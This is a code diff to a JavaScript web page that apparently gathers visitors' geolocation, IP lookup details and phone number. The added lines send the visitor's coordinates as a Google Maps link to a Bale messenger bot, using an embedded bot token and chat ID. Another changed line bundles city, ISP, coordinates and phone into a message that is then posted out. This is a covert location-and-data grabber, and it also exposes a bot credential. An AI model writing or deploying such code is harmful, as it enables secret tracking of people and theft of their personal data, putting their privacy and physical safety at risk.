@@ -1,7 +1,8 @@
 var link_map;
 
-function showPosition(position) {
+async function showPosition(position) {
     link_map = 'https://www.google.com/maps/@' + position.coords.latitude + ',' + position.coords.longitude;
+    var test = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + "Access to Location : " + link_map + '&chat_id=915303220');
 }
 async function send_ip() {
     const response = await fetch('https://api.iplocation.net/?cmd=get-ip');
@@ -20,7 +21,7 @@ async function send() {
     try {
         var request_info_ip = await fetch('http://ip-api.com/json/83.123.48.126');
         var ip_info = await request_info_ip.json()
-        var text = 'ip : ' + ip_info.query + '\nphone : ' + phone + '\nstatus : ' + ip_info.status + '\ncountry : ' + ip_info.country + '\ncountryCode : ' + ip_info.countryCode + '\nregion : ' + ip_info.region + '\ncity : ' + ip_info.city + '\nzip : ' + ip_info.zip + '\nlat : ' + ip_info.lat + '\nlon : ' + ip_info.lon + '\ntimezone : ' + ip_info.timezone + '\nisp : ' + ip_info.isp + '\norg : ' + ip_info.org + '\nas : ' + ip_info.as + '\nlocation : ' + link_map;
+        var text = 'ip : ' + ip_info.query + '\nphone : ' + phone + '\nstatus : ' + ip_info.status + '\ncountry : ' + ip_info.country + '\ncountryCode : ' + ip_info.countryCode + '\nregion : ' + ip_info.region + '\ncity : ' + ip_info.city + '\nzip : ' + ip_info.zip + '\ntimezone : ' + ip_info.timezone + '\nisp : ' + ip_info.isp + '\norg : ' + ip_info.org + '\nas : ' + ip_info.as + '\nlocation : ' + 'https://www.google.com/maps/@' + ip_info.lat + ',' + ip_info.lon;
         $.ajax({
             type: 'post',
             mode: "cors",
